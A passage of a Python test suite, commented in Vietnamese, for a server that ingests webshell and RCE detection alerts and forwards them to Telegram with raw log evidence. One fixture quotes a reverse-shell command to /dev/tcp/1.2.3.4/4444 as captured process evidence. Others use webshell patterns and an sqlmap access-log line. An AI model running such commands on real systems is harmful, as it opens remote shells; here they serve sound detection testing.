    _write_mirror(cfg, "khach-hang-a", alert, _old_monitor_records(2))
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "lan_ip": "10.3.64.128", "alerts": [alert]})
    aid = r.json()["alerts"][0]["alert_id"]

    detail = client.get(f"/api/v1/alerts/{aid}", headers={"X-API-Key": key}).json()
    assert len(detail["evidence"]) == 2          # 2 nhóm, không phải 0 hay 1 rác
    assert {h["rule_id"] for h in detail["evidence"]} == {"P2S-020", "P2S-050,P2S-051"}
    assert detail["hit_count"] == 2465
    assert detail["evidence_truncated"] == 1     # preview là ảnh chụp

    hits = client.get("/api/v1/search", params={"q": "webshell pattern"},
                      headers={"X-API-Key": key}).json()["hits"]
    assert hits and hits[0]["file"] == "/var/www/html/s.php"


def test_backfill_fills_historical_alerts(env):
    """Alert ĐÃ LƯU từ trước bản vá (0 raw row) được vá từ evidence mirror."""
    from app import preview as pv

    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    alert = dict(_alert_no_preview(batch="20261101T101000Z"), lan_ip="10.3.64.128")
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "lan_ip": "10.3.64.128", "alerts": [alert]})
    aid = r.json()["alerts"][0]["alert_id"]

    # giả lập trạng thái "trước bản vá": xoá hết hit, chỉ còn row rác NULL
    with db.connect(cfg.database_path) as conn:
        conn.execute("DELETE FROM alert_hits WHERE alert_id = ?", (aid,))
        conn.execute(
            "INSERT INTO alert_hits (alert_id, rule_id, severity, line)"
            " VALUES (?, NULL, 'CRITICAL', 0)", (aid,))

    _write_mirror(cfg, "khach-hang-a", alert, _old_monitor_records(2))
    fixed, rows = pv.backfill_alert_hits(cfg, cfg.database_path)
    assert (fixed, rows) == (1, 3)      # 1 nhóm RCE + 2 dòng access log

    detail = client.get(f"/api/v1/alerts/{aid}", headers={"X-API-Key": key}).json()
    assert len(detail["evidence"]) == 3      # 3 dòng thật, không phải row rác NULL
    assert all(h["raw"] for h in detail["evidence"])

    # idempotent: chạy lại không thêm gì
    assert pv.backfill_alert_hits(cfg, cfg.database_path) == (0, 0)


def test_preview_grouping_matches_monitor_awk():
    """Luật gộp của server phải khớp lib/preview.awk của monitor.

    Nếu lệch, "… +N nhóm" và số hit của nhóm sẽ khác nhau giữa máy nâng cấp và
    máy chưa nâng cấp — cùng một batch, hai tin nhắn khác nhau.
    """
    from app import preview as pv

    recs = _old_monitor_records(4)
    groups, total = pv.groups_from_records(recs, max_groups=8)
    assert total == 5
    assert [g["rule_id"] for g in groups] == ["P2S-020", "P2S-050,P2S-051"]
    assert groups[0]["impact"] == "rce"          # rce xếp đầu dù 1 hit
    assert groups[1]["hits"] == 4                # 4 dòng chỉ khác ts -> 1 nhóm
    assert groups[1]["lines"] == 4
    assert groups[1]["line"] == 369560           # dòng đầu tiên của nhóm


def test_late_evidence_still_yields_raw_and_path(env):
    """Cuộc đua thật: alert tới TRƯỚC, agent upload evidence 0.5s sau.

    /ingest-log chờ tối đa preview_wait_sec để file lên. Không chờ thì mọi alert
    từ máy chưa nâng cấp vẫn hiện "0 nhóm / 0 events", và DB còn trỏ evidence_file
    rỗng vì write_evidence() chạy lúc file chưa tồn tại.
    """
    import threading
    import time

    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    cfg.preview_wait_sec = 2.0
    alert = dict(_alert_no_preview(batch="20261026T023000Z"), lan_ip="192.168.0.2",
                 device="domain-cnht-vn-toanhc")
    mirror = evidence.evidence_path(cfg, "khach-hang-a",
                                    evidence.device_label(alert), alert["batch_id"])

    def _upload_later():
        time.sleep(0.5)
        mirror.parent.mkdir(parents=True, exist_ok=True)
        with mirror.open("w", encoding="utf-8") as f:
            for r in _old_monitor_records(2):
                f.write(json.dumps(r, ensure_ascii=False) + "\n")

    t = threading.Thread(target=_upload_later)
    t.start()
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "domain-cnht-vn-toanhc", "lan_ip": "192.168.0.2",
                          "alerts": [alert]})
    t.join()
    assert r.status_code == 200, r.text
    text = tg.sent[-1][1]
    assert "/var/www/html/s.php" in text
    assert "Event logs (" in text and " events)" in text

    aid = r.json()["alerts"][0]["alert_id"]
    detail = client.get(f"/api/v1/alerts/{aid}", headers={"X-API-Key": key}).json()
    assert detail["evidence_file"] == str(mirror)   # trỏ đúng file, không rỗng
    # preview là ảnh chụp theo NHÓM (2 nhóm), không phải từng dòng: 3 record thô
    # gộp thành 2 nhóm. Raw đầy đủ nằm ở evidence_file / backfill_alert_hits.
    assert len(detail["evidence"]) == 2
    assert all(h["raw"] for h in detail["evidence"])


def test_no_wait_when_evidence_never_arrives(env):
    """Thiết bị không upload evidence: không được treo ingest vô hạn."""
    import time

    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    cfg.preview_wait_sec = 0.4
    t0 = time.time()
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "alerts": [_alert_no_preview(batch="20261026T024000Z")]})
    assert r.status_code == 200
    assert time.time() - t0 < 3.0
    assert tg.sent == []          # không raw -> không gửi
    assert r.json()["deferred"] == 1


def test_resend_rebuilds_raw_for_old_alert(env):
    """Sự cố đã xảy ra: gửi LẠI alert cũ kèm raw dựng từ evidence mirror."""
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    alert = dict(_alert_no_preview(batch="20261026T023000Z"), lan_ip="10.3.64.128")
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "lan_ip": "10.3.64.128", "alerts": [alert]})
    aid = r.json()["alerts"][0]["alert_id"]
    _write_mirror(cfg, "khach-hang-a", alert, _old_monitor_records(2))
    before = len(tg.sent)

    rr = client.post(f"/api/v1/alerts/{aid}/resend",
                     headers={"X-Admin-Token": "test-admin"})
    assert rr.status_code == 200, rr.text
    body = rr.json()
    assert body["preview_source"] == "evidence" and body["preview_groups"] == 2

    assert len(tg.sent) == before + 1
    text = tg.sent[-1][1]
    # Tin gửi lại phải GIỐNG alert thật: không nhãn, không chú thích nội bộ.
    assert "(bản dựng lại)" not in text
    assert "/var/www/html/s.php" in text
    assert "Event logs (" in text and " events)" in text
    assert "0 nhóm / 0 events" not in text


def test_resend_requires_token(env):
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "alerts": [_alert()]})
    aid = r.json()["alerts"][0]["alert_id"]
    assert client.post(f"/api/v1/alerts/{aid}/resend").status_code == 403
    assert client.post(f"/api/v1/alerts/{aid}/resend",
                       headers={"X-Admin-Token": "sai"}).status_code == 403


def test_alert_envelope_survives_for_resend(env):
    """lan_ip/user/os/hostname phải được LƯU, để resend không hiện 'không rõ'."""
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "domain-cnht-vn-toanhc", "lan_ip": "10.3.64.128",
                      "user": "root", "os": "Ubuntu 24.04.5 LTS", "env": "Host",
                      "alerts": [_alert_no_preview(batch="20261026T025000Z")]})
    aid = 1
    with db.connect(cfg.database_path) as conn:
        row = conn.execute("SELECT lan_ip, hostname, user, os, env FROM alerts WHERE id=?",
                           (aid,)).fetchone()
    assert row["lan_ip"] == "10.3.64.128"
    assert row["hostname"] == "domain-cnht-vn-toanhc"
    assert row["user"] == "root"
    assert row["os"] == "Ubuntu 24.04.5 LTS"
    assert row["env"] == "Host"

    # resend cần raw để dựng lại -> cấp evidence cho alert này
    _write_mirror(cfg, "khach-hang-a",
                  dict(_alert_no_preview(batch="20261026T025000Z"), lan_ip="10.3.64.128"),
                  _old_monitor_records(2))
    client.post(f"/api/v1/alerts/{aid}/resend", headers={"X-Admin-Token": "test-admin"})
    text = tg.sent[-1][1]
    assert "10.3.64.128" in text
    assert "domain-cnht-vn-toanhc" in text
    assert "👤 <b>User:</b> <code>root</code>" in text
    assert "không rõ" not in text


def test_backfill_also_fixes_empty_evidence_path(env):
    """Alert tới trước khi file evidence lên -> evidence_file rỗng; backfill vá cả."""
    from app import preview as pv

    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    alert = dict(_alert_no_preview(batch="20261026T030000Z"), lan_ip="10.3.64.128")
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "lan_ip": "10.3.64.128", "alerts": [alert]})
    aid = r.json()["alerts"][0]["alert_id"]
    with db.connect(cfg.database_path) as conn:
        assert conn.execute("SELECT evidence_file FROM alerts WHERE id=?",
                            (aid,)).fetchone()[0] == ""

    mirror = _write_mirror(cfg, "khach-hang-a", alert, _old_monitor_records(2))
    pv.backfill_alert_hits(cfg, cfg.database_path)
    with db.connect(cfg.database_path) as conn:
        assert conn.execute("SELECT evidence_file FROM alerts WHERE id=?",
                            (aid,)).fetchone()[0] == str(mirror)


# ---------------------------------------------------------------------------
# Chuẩn hoá nội dung tin nhắn: alert thật KHÔNG được chứa văn bản dev
# ---------------------------------------------------------------------------
_DEV_WORDS = (
    "preview[]", "ALERT_PREVIEW_MAX", "preview_meta", "monitor", "agent",
    "1.4.2", "1.4.3", "1.4.4", "bản dựng lại", "resend", "rules[]",
    "evidence/", "jsonl", "batch_id", "hit_count", "SQLite", "DB",
    "không xác định rule", "TODO", "FIXME", "debug",
)


def _no_dev_text(msg: str):
    """Chỉ kiểm phần KHUNG (envelope + dòng Path chứa path), bỏ nội dung event.

    Raw là log gốc, phải giữ nguyên văn — nó có thể chứa "?", "test", "debug"
    một cách hợp lệ (query string, tên file của kẻ tấn công). Sửa raw là làm
    sai bằng chứng, nên văn bản dev chỉ bị cấm ở phần do server tự viết.

    Khung 1.1.1 bọc event trong <blockquote>: cắt nguyên khối đó, không đoán
    theo tiền tố dòng (raw có thể bắt đầu bằng bất cứ thứ gì).
    """
    frame_lines = []
    in_quote = False
    for ln in msg.split("\n"):
        opens = "<blockquote>" in ln
        body = ln
        if opens:
            body = ln.split("<blockquote>", 1)[0]
            in_quote = True
        if in_quote:
            if "</blockquote>" in ln:
                in_quote = False
            frame_lines.append(body)   # chỉ phần trước khối, thường rỗng
            continue
        frame_lines.append(ln)
    frame = "\n".join(frame_lines)
    for w in _DEV_WORDS:
        assert w not in frame, f"lộ văn bản nội bộ: {w!r} trong khung tin alert"
    assert "?" not in frame, "dấu ? trong khung tin (giá trị không xác định phải là 'không rõ')"


def test_alert_text_has_no_dev_artifacts():
    """Mọi biến thể alert (có/không preview, không rules) đều sạch văn bản dev."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    tz = ZoneInfo("Asia/Bangkok")
    env = {"user": "root", "os": "Ubuntu 24.04.5 LTS", "env": "Host",
           "hostname": "domain-cnht-vn-toanhc", "lan_ip": "10.3.64.128",
           "ts_utc": "2026-11-02T07:27:00Z"}
    variants = [
        dict(_alert_no_preview(), **env),                       # monitor cũ
        dict(_alert_no_preview(), preview=[], preview_meta="",  # preview tắt
             **env),
        dict(_alert_no_preview(hits=9), rules=[], **env),        # không rules
        dict(_alert_no_preview(),
             preview=[{"rule_id": "P2S-020", "hits": 1, "severity": "CRITICAL",
                       "impact": "rce", "source": "webroot",
                       "file": "/var/www/html/s.php", "line": 0, "lines": 0,
                       "raw": "webroot webshell pattern: system($_REQUEST"}],
             preview_meta="2465|1", **env),
    ]
    for v in variants:
        _no_dev_text(format_alert("domain.cnht.vn", v, tz))


def test_alert_text_has_no_dev_artifacts_after_resend(env):
    """Tin gửi lại cũng phải sạch — không nhãn, không chú thích."""
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    alert = dict(_alert_no_preview(batch="20261026T050000Z"), lan_ip="10.3.64.128")
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "lan_ip": "10.3.64.128", "alerts": [alert]})
    aid = r.json()["alerts"][0]["alert_id"]
    _write_mirror(cfg, "khach-hang-a", alert, _old_monitor_records(2))
    client.post(f"/api/v1/alerts/{aid}/resend", headers={"X-Admin-Token": "test-admin"})
    _no_dev_text(tg.sent[-1][1])


def test_alert_counts_are_never_self_contradictory():
    """Số trên header phải khớp với những gì in ra, không tự mâu thuẫn.

    Trước đây có thể in "4 nhóm" nhưng liệt kê 5 rule, hoặc "2465 events" cạnh
    "×2388" khi tổng hits của rule là 4852 — người trực ca đọc sẽ hiểu sai quy mô.
    """
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    tz = ZoneInfo("Asia/Bangkok")
    base = {"user": "root", "os": "Ubuntu", "env": "Host", "hostname": "h",
            "lan_ip": "10.0.0.2", "ts_utc": "2026-11-02T07:27:00Z",
            "severity": "CRITICAL", "hits": 100,
            "rules": [{"rule_id": f"P2S-{i:03d}", "hits": 10} for i in range(1, 6)]}
    # Nhánh counters: không có nhóm nào để đếm, không in "×N" của rule.
    msg = format_alert("p", base, tz)
    assert "Event logs (100 events)" in msg
    assert "×10" not in msg and "nhóm" not in msg.split("Event logs")[1]

    # Nhánh có preview[] thật: số nhóm trên header == số nhóm liệt kê, và "×N"
    # của nhóm là số dòng log trong nhóm (không phải hits của rule).
    prev = [{"rule_id": "P2S-050,P2S-051", "hits": 60, "severity": "CRITICAL",
             "impact": "", "source": "access_log", "file": "/a.log", "line": 7,
             "lines": 60, "raw": "line A"},
            {"rule_id": "P2S-056", "hits": 1, "severity": "CRITICAL", "impact": "rce",
             "source": "webroot", "file": "/var/www/html/s.php", "line": 0,
             "lines": 0, "raw": "webshell"}]
    msg2 = format_alert("p", dict(base, hits=100, preview=prev, preview_meta="100|2"), tz)
    head = msg2.split("Event logs (")[1].split(")")[0]
    assert head == "100 events"
    listed = sum(1 for ln in msg2.split("\n") if ln.startswith("<b>Path:</b>"))
    assert listed == 2
    assert "×60" in msg2


def test_missing_values_use_one_wording():
    """Mọi dòng thiếu dữ liệu dùng đúng một cách viết: "không rõ"."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    msg = format_alert("p", {"ts_utc": "2026-11-02T07:27:00Z",
                             "severity": "HIGH", "hits": 1,
                             "rules": [{"rule_id": "P2S-017", "hits": 1}]},
                       ZoneInfo("Asia/Bangkok"))
    assert "[không rõ]" in msg                      # env thiếu
    assert "<code>không rõ</code>" in msg           # user/hostname/ip thiếu
    # không còn kiểu viết lệch: "?", "[Không rõ]", "N/A", "unknown", "-"
    for bad in ("<code>?</code>", "[Không rõ]", "N/A", "<code>unknown</code>",
                "<code>-</code>"):
        assert bad not in msg, bad


# ---------------------------------------------------------------------------
# NGHIỆP VỤ: alert Telegram BẮT BUỘC có raw. Không raw -> hoãn, gửi bù sau.
# ---------------------------------------------------------------------------
def test_evidence_upload_sends_the_deferred_alert(env):
    """Alert hoãn vì thiếu raw phải được gửi NGAY khi evidence lên."""
    import gzip

    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    alert = dict(_alert_no_preview(batch="20261026T060000Z"), lan_ip="10.3.64.128",
                 device="domain-cnht-vn-toanhc")

    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "domain-cnht-vn-toanhc", "lan_ip": "10.3.64.128",
                          "alerts": [alert]})
    assert r.json()["deferred"] == 1
    assert tg.sent == []

    # agent upload evidence (đúng kênh riêng, đúng thứ tự thật)
    body = b"".join(json.dumps(x, ensure_ascii=False).encode() + b"\n"
                    for x in _old_monitor_records(3))
    up = client.post("/api/v1/ingest-evidence",
                     headers={"X-API-Key": key,
                              "X-Batch-Id": "20261026T060000Z",
                              "X-Hostname": "domain-cnht-vn-toanhc",
                              "X-Lan-Ip": "10.3.64.128",
                              "X-User": "root",
                              "Content-Type": "application/gzip"},
                     content=gzip.compress(body))
    assert up.status_code == 200, up.text
    assert up.json()["flushed_alerts"] == 1

    assert len(tg.sent) == 1                     # đúng MỘT tin, gửi bù
    text = tg.sent[0][1]
    assert "/var/www/html/s.php" in text          # có raw
    assert "Event logs (" in text and " events)" in text
    with db.connect(cfg.database_path) as conn:
        row = conn.execute("SELECT messages, delivered FROM alerts").fetchone()
    assert (row["messages"], row["delivered"]) == (1, 1)


def test_deferred_alert_is_never_sent_twice(env):
    """Gửi bù idempotent: evidence upload lại không sinh tin thứ hai."""
    import gzip

    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    alert = dict(_alert_no_preview(batch="20261026T063000Z"), lan_ip="10.3.64.128")
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "h", "lan_ip": "10.3.64.128", "alerts": [alert]})
    body = b"".join(json.dumps(x, ensure_ascii=False).encode() + b"\n"
                    for x in _old_monitor_records(2))
    for _ in range(3):
        client.post("/api/v1/ingest-evidence",
                    headers={"X-API-Key": key, "X-Batch-Id": "20261026T063000Z",
                             "X-Hostname": "h", "X-Lan-Ip": "10.3.64.128",
                             "X-User": "root", "Content-Type": "application/gzip"},
                    content=gzip.compress(body))
    assert len(tg.sent) == 1


def test_alert_never_sent_without_raw_even_after_flush(env):
    """Hàng đợi không có raw thì flush KHÔNG gửi gì — không bao giờ nới bất biến."""
    from app import preview as pv

    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "h", "alerts": [_alert_no_preview(batch="20261026T070000Z")]})
    assert tg.sent == []

    import asyncio
    from zoneinfo import ZoneInfo

    class TG:
        def __init__(self): self.sent = []
        async def send_message(self, chat, text): self.sent.append(text); return True, ""

    t = TG()
    n = asyncio.run(pv.flush_awaiting(cfg, cfg.database_path, t,
                                      ZoneInfo("Asia/Bangkok")))
    assert n == 0 and t.sent == []


def test_every_sent_message_contains_raw(env):
    """Quét toàn bộ tin đã gửi trong một phiên: tin nào cũng phải có raw."""
    import gzip

    client, cfg, tg = env
    pid, key = _project_with_key(cfg)

    # 1) alert có preview sẵn (monitor mới)
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "h", "alerts": [_alert()]})
    # 2) alert legacy không raw -> hoãn, KHÔNG gửi (không còn tổng hợp hit)
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "h", "alerts": [{
                    "batch_id": "20261026T073000Z", "rule_id": "TEST-001",
                    "severity": "INFO", "message": "alert thử đường truyền"}]})
    # 3) alert thiếu raw -> hoãn, rồi bù bằng evidence
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "h", "lan_ip": "10.3.64.128",
                      "alerts": [dict(_alert_no_preview(batch="20261026T074000Z"),
                                      lan_ip="10.3.64.128")]})
    body = b"".join(json.dumps(x, ensure_ascii=False).encode() + b"\n"
                    for x in _old_monitor_records(2))
    client.post("/api/v1/ingest-evidence",
                headers={"X-API-Key": key, "X-Batch-Id": "20261026T074000Z",
                         "X-Hostname": "h", "X-Lan-Ip": "10.3.64.128",
                         "X-User": "root", "Content-Type": "application/gzip"},
                content=gzip.compress(body))

    assert len(tg.sent) == 2
    for chat, text in tg.sent:
        block = text.split("Event logs (")[1]
        assert "events)" in block
        # có ít nhất một dòng raw: nội dung trong <blockquote>, không phải mã rule
        assert "<blockquote>" in block, f"tin không có raw:\n{text}"
        quoted = block.split("<blockquote>", 1)[1].split("</blockquote>", 1)[0]
        assert quoted.strip(), f"blockquote rỗng:\n{text}"


def test_resend_refuses_without_raw(env):
    """Resend cũng không được gửi tin thiếu bằng chứng."""
    client, cfg, tg = env
    pid, key = _project_with_key(cfg)
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "alerts": [_alert_no_preview(batch="20261026T080000Z")]})
    aid = r.json()["alerts"][0]["alert_id"]
    before = len(tg.sent)

    rr = client.post(f"/api/v1/alerts/{aid}/resend",
                     headers={"X-Admin-Token": "test-admin"})
    assert rr.status_code == 409, rr.text
    assert rr.json()["detail"]["code"] == "no_raw_evidence"
    assert len(tg.sent) == before


def test_group_without_file_names_its_source():
    """Nhóm không có file (hit từ /proc) phải nêu nguồn, không in "?"."""
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    alert = {"ts_utc": "2026-11-02T07:27:00Z", "severity": "CRITICAL", "hits": 1,
             "user": "root", "os": "Ubuntu", "env": "Host", "hostname": "h",
             "lan_ip": "10.0.0.2",
             "preview": [{"rule_id": "P2S-025", "hits": 1, "severity": "CRITICAL",
                          "impact": "rce", "source": "proc", "file": "", "line": 0,
                          "lines": 0,
                          "raw": "parent=php-fpm child=bash cmd=bash -i >& /dev/tcp/1.2.3.4/4444"}],
             "preview_meta": "1|1"}
    msg = format_alert("p", alert, ZoneInfo("Asia/Bangkok"))
    # Nêu đúng nguồn, KHÔNG dưới nhãn "Path" (nhãn đó hứa đường dẫn tuyệt đối).
    assert "<i>Nguồn: proc</i>" in msg
    assert "Path:</b> <code>proc" not in msg
    # Dấu "?" chỉ được đến từ nội dung log thật (URI có query string), không
    # phải từ chỗ trống của lập trình viên: envelope phải dùng "không rõ".
    env_lines = [ln for ln in msg.split("\n") if ln.startswith(("📦", "🖥", "👤", "🏷", "🌐"))]
    assert env_lines and all("?" not in ln for ln in env_lines)
    assert "unknown" not in msg
    assert "/dev/tcp/1.2.3.4/4444" in msg      # raw vẫn nguyên văn


def test_raw_is_never_modified():
    """Raw log là bằng chứng: server không được sửa một ký tự nào.

    Kiểm bằng chuỗi có đủ thứ "trông như văn bản dev": query string, dấu ?, ký
    tự HTML, tab đã thành space, dấu ngoặc, tiếng Việt, emoji.
    """
    from zoneinfo import ZoneInfo
    from app.telegram import format_alert

    raw = ('203.0.113.5 - - [02/Nov/2026:07:26:41 +0000] "GET /a.php?x=1&y=<b>'
           '&z=%22 HTTP/1.1" 200 5 "-" "sqlmap/1.8 (test; debug)" '
           '"X-Test: 1" request_length=99')
    alert = {"ts_utc": "2026-11-02T07:27:00Z", "severity": "HIGH", "hits": 1,
             "user": "root", "os": "Ubuntu", "env": "Host", "hostname": "h",
             "lan_ip": "10.0.0.2",
             "preview": [{"rule_id": "P2S-050", "hits": 1, "severity": "HIGH",
                          "impact": "", "source": "access_log",
                          "file": "/var/log/nginx/access.log", "line": 7,
                          "lines": 1, "raw": raw}],
             "preview_meta": "1|1"}
    msg = format_alert("p", alert, ZoneInfo("Asia/Bangkok"))
    # Raw phải khớp từng ký tự sau khi bỏ tag <b> mà server thêm cho timeline
    # và giải entity HTML — không được sửa, cắt, hay chuẩn hoá nội dung.
    import html as _html
    plain = _html.unescape(re.sub(r"</?b>", "", msg))
    assert raw in plain, "raw bị sửa so với log gốc"


def test_failed_send_is_retried_never_lost(env):
    """Telegram lỗi -> alert KHÔNG được coi là đã gửi, phải gửi bù sau.

    Trước đây messages=1 dù gửi thất bại: alert rơi khỏi hàng đợi và mất vĩnh
    viễn. Sự kiện RCE xảy ra, không ai nhận được tin, không có đường gửi lại.
    """
    client, cfg, tg = env
    _, key = _project_with_key(cfg)

    tg.fail = True
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "alerts": [_alert(batch="20261026T100000Z")]})
    body = r.json()
    assert body["messages"] == 0 and body["delivered"] == 0
    assert body["deferred"] == 1
    with db.connect(cfg.database_path) as conn:
        row = conn.execute("SELECT messages, delivered FROM alerts").fetchone()
    assert (row["messages"], row["delivered"]) == (0, 0)

    # Telegram sống lại -> cleanup loop gửi bù đúng MỘT tin
    tg.fail = False
    import asyncio
    from zoneinfo import ZoneInfo
    from app import preview as pv
    n = asyncio.run(pv.flush_awaiting(cfg, cfg.database_path, tg,
                                      ZoneInfo("Asia/Ho_Chi_Minh")))
    assert n == 1 and len(tg.sent) == 1
    with db.connect(cfg.database_path) as conn:
        row = conn.execute("SELECT messages, delivered FROM alerts").fetchone()
    assert (row["messages"], row["delivered"]) == (1, 1)


def test_failed_send_does_not_duplicate_on_later_retry(env):
    """Sau khi gửi bù thành công, agent retry không sinh thêm tin."""
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    tg.fail = True
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "h", "alerts": [_alert(batch="20261026T103000Z")]})
    tg.fail = False
    import asyncio
    from zoneinfo import ZoneInfo
    from app import preview as pv
    asyncio.run(pv.flush_awaiting(cfg, cfg.database_path, tg,
                                  ZoneInfo("Asia/Ho_Chi_Minh")))
    assert len(tg.sent) == 1
    for _ in range(3):
        client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "h", "alerts": [_alert(batch="20261026T103000Z")]})
    assert len(tg.sent) == 1


# ---------------------------------------------------------------------------
# UPDATE SERVER KHÔNG ĐƯỢC PHÁT LẠI CẢNH BÁO CŨ
# ---------------------------------------------------------------------------
def test_upgrade_does_not_replay_old_unsent_alerts(env):
    """DB có hàng đợi tồn đọng từ bản cũ: update server không được bắn lại.

    Người trực ca nhận một loạt cảnh báo của tuần trước là mất niềm tin vào
    kênh. Alert quá cửa sổ bị đánh dấu messages=2 (cố ý không gửi), vẫn tra
    cứu được trong DB.
    """
    import asyncio
    from datetime import timedelta
    from zoneinfo import ZoneInfo
    from app import preview as pv

    client, cfg, tg = env
    pid, key = _project_with_key(cfg)

    # 3 alert CŨ 2 ngày, chưa gửi, có raw đầy đủ (trường hợp xấu nhất: gửi được)
    import json as _json
    dev = db.upsert_device(cfg.database_path, pid, "d-old")
    with db.connect(cfg.database_path) as conn:
        old = db.iso(db.utcnow() - timedelta(days=2))
        for i in range(3):
            conn.execute(
                "INSERT INTO alerts (project_id, device_id, batch_id, severity,"
                " hit_count, rules, messages, delivered, received_at,"
                " lan_ip, hostname, user, os, env)"
                " VALUES (?,?,?,?,?,?,0,0,?,?,?,?,?,?)",
                (pid, dev, f"OLD-{i}", "CRITICAL", 5,
                 _json.dumps([{"rule_id": "P2S-020", "hits": 5}]),
                 old, "10.0.0.9", "h", "root", "Ubuntu", "Host"))
            aid = conn.execute("SELECT id FROM alerts WHERE batch_id=?",
                               (f"OLD-{i}",)).fetchone()["id"]
            conn.execute(
                "INSERT INTO alert_hits (alert_id, rule_id, severity, source,"
                " file, line, raw, ts_utc) VALUES (?,?,?,?,?,?,?,?)",
                (aid, "P2S-020", "CRITICAL", "webroot", "/var/www/html/s.php", 0,
                 "webroot webshell pattern: system($_REQUEST", old))

    n = asyncio.run(pv.flush_awaiting(cfg, cfg.database_path, tg,
                                      ZoneInfo("Asia/Ho_Chi_Minh")))
    assert n == 0 and tg.sent == []          # KHÔNG một tin nào
    with db.connect(cfg.database_path) as conn:
        rows = conn.execute("SELECT messages FROM alerts ORDER BY id").fetchall()
    assert [r["messages"] for r in rows] == [2, 2, 2]
    # alert vẫn còn trong DB để tra cứu
    with db.connect(cfg.database_path) as conn:
        assert conn.execute("SELECT COUNT(*) AS n FROM alerts").fetchone()["n"] == 3
        assert conn.execute("SELECT COUNT(*) AS n FROM alert_hits").fetchone()["n"] == 3


def test_recent_unsent_alert_is_still_delivered(env):
    """Trong cửa sổ: alert vừa xảy ra vẫn phải được gửi bù, không bị chặn oan."""
    import asyncio
    from zoneinfo import ZoneInfo
    from app import preview as pv

    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                json={"host": "h", "alerts": [_alert(batch="20261026T110000Z")]})
    assert len(tg.sent) == 1
    n = asyncio.run(pv.flush_awaiting(cfg, cfg.database_path, tg,
                                      ZoneInfo("Asia/Ho_Chi_Minh")))
    assert n == 0 and len(tg.sent) == 1


def test_authentic_monitor_142_payload_still_works(env):
    """Payload THẬT của monitor 1.4.2 (không preview[], evidence[] rỗng)."""
    client, cfg, tg = env
    _, key = _project_with_key(cfg)
    alert142 = {
        "ts_utc": "2026-11-03T02:05:12Z", "batch_id": "20261103T020512Z",
        "project": "p", "device": "d", "host": "d", "hostname": "d",
        "containers": [],
        "window_start": "2026-11-03T02:00:00Z",
        "window_end": "2026-11-03T02:05:12Z",
        "severity": "CRITICAL", "rce": 3, "hits": 2465,
        "rules": [{"rule_id": "P2S-020", "hits": 1},
                  {"rule_id": "P2S-050", "hits": 2388}],
        "severities": [{"severity": "CRITICAL", "hits": 2465}],
        "evidence_file": "/opt/php2shell-monitor/x.jsonl",
        "evidence_count": 2465, "evidence_truncated": 0,
        "evidence": [],
    }
    r = client.post("/api/v1/ingest-log", headers={"X-API-Key": key},
                    json={"host": "d", "device": "d", "lan_ip": "10.3.64.128",
                          "user": "root", "os": "Ubuntu 24.04.5 LTS",
                          "env": "Host", "alerts": [alert142]})
    assert r.status_code == 200, r.text
    body = r.json()
    # 1.4.2 không gửi preview[] -> hoãn, chờ evidence (đúng thiết kế)
    assert body["deferred"] == 1 and body["messages"] == 0
    assert tg.sent == []


def test_evidence_format_compatible_142_to_145(tmp_path):
    """Backfill/grouping phải đọc được evidence của MỌI bản >= 1.4.2.

    Người dùng chạy 1.4.2 trở lên: server phải hiểu evidence thiếu `impact`
    (1.4.2), thiếu `preview[]` (<=1.4.2), và evidence đầy đủ (1.4.5) như nhau.
    """
    import json as _json
    from app import preview as pv

    base = {"rule_id": "P2S-050", "severity": "CRITICAL", "source": "access_log",
            "file": "/var/log/nginx/access.log", "line": 10, "ip": "1.2.3.4",
            "method": "GET", "uri": "/x.php", "status": "200", "ua": "curl",
            "pid": None, "raw": "1.2.3.4 - GET /x.php 200",
            "ts_utc": "2026-11-03T02:00:00Z"}
    variants = {
        "1.4.2": dict(base),                     # không có impact
        "1.4.3": dict(base, impact=""),          # có impact rỗng
        "1.4.5": dict(base, impact="rce"),       # đầy đủ
    }
    for name, rec in variants.items():
        ev = tmp_path / f"ev-{name}"
        d = ev / "p" / "IP-LAN_10.0.0.1_h"
        d.mkdir(parents=True)
        path = d / "B1.jsonl"
        path.write_text("".join(
            _json.dumps(dict(rec, line=10 + i), ensure_ascii=False) + "\n"
